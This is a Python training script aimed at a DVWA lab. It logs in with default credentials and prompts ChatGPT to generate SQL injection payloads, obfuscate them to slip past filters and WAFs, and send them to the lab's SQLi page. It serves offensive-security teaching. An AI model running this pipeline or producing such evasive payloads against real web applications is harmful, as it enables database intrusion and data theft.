"""
ChatGPT for offensive cybersecurity
Crafting SQLi Payloads
['Use ChatGPT to create effective SQLi payloads for error-based, blind, and time-based SQLi attacks.', 'Develop a comprehensive SQLi payload library with ChatGPT, addressing various database engines and configurations.', 'Apply ChatGPT to obfuscate SQLi payloads, evading simple input filters and WAFs.', 'Implement ChatGPT-driven validation to ensure payload effectiveness against modern web applications.']
This script is for for training purposes only
"""
import requests
import sys
import os
current_dir = os.path.dirname(os.path.abspath(__file__))
class_dir = os.path.join(current_dir, "..", "class")
sys.path.append(class_dir)

from dvwa_session import DVWA_Session
from chatgpt_func import ChatGPT_Func
from general_func import General_Func

class PointlessAI_crafting_sqli_payloads(DVWA_Session, ChatGPT_Func, General_Func):
    def __init__(self):
        DVWA_Session.__init__(self)
        ChatGPT_Func.__init__(self) 
        General_Func.__init__(self)
        
    def generate_sql_payloads(self, attack_type):
        guidance = f"{self.phishing_disclaimer}, {self.no_markdown}. Use ChatGPT to create effective SQLi payloads for {attack_type}, addressing various database engines and configurations."
        payload_prompt = f"Generate SQL injection payload for a {attack_type} attack."
        sql_payload = self.red_team_query(payload_prompt, guidance)
        return sql_payload
    
    def obfuscate_payload(self, payload):
        guidance = f"{self.phishing_disclaimer}, {self.no_markdown}" + " Apply ChatGPT to obfuscate SQLi payloads, evading simple input filters and WAFs."
        obfuscated_payload = self.red_team_query(f"Obfuscate the following SQL injection payload: {payload}", guidance)
        return obfuscated_payload
    
    def validate_payload(self, payload, url):
        guidance = self.phishing_disclaimer + " Implement ChatGPT-driven validation to ensure payload effectiveness against modern web applications."
        validation_prompt = f"Validate the effectiveness of the following SQL injection payload against the target URL {url}?id={payload}&Submit=Submit"
        validation_response = self.red_team_query(validation_prompt, guidance)
        return validation_response
    
    def exploit_dvwa_sqli(self, s):
        urls = [self.sql_injection]
        for attack_type in ["error-based", "blind", "time-based"]:
            print(f"Generating payload for {attack_type} SQL injection")
            payload = self.generate_sql_payloads(attack_type)
            obfuscated_payload = self.obfuscate_payload(payload)
            for url in urls:
                print(url)
                validation_response = self.validate_payload(obfuscated_payload, url)
                print(validation_response)
                
                response = s.get(url, params={"id": obfuscated_payload, "Submit": "Submit"}, headers=self.headers, proxies=self.proxies)
                if "SQL syntax" not in response.text:
                    print(f"Successful {attack_type} SQL injection on {url} with payload: {obfuscated_payload}")
                else:
                    print(f"Payload failed for {attack_type} SQL injection on {url}")

def main():
    ai = PointlessAI_crafting_sqli_payloads() # Instantiate class
    # Start session
    with requests.Session() as s:
        user_token, cookies = ai.get_csrf_token_and_cookie(s, ai.base_url + "/login.php")
        _ = ai.login_to_dvwa(s, ai.login_url, "admin", "password", user_token)
        
        ai.exploit_dvwa_sqli(s)

if __name__ == "__main__":
    main()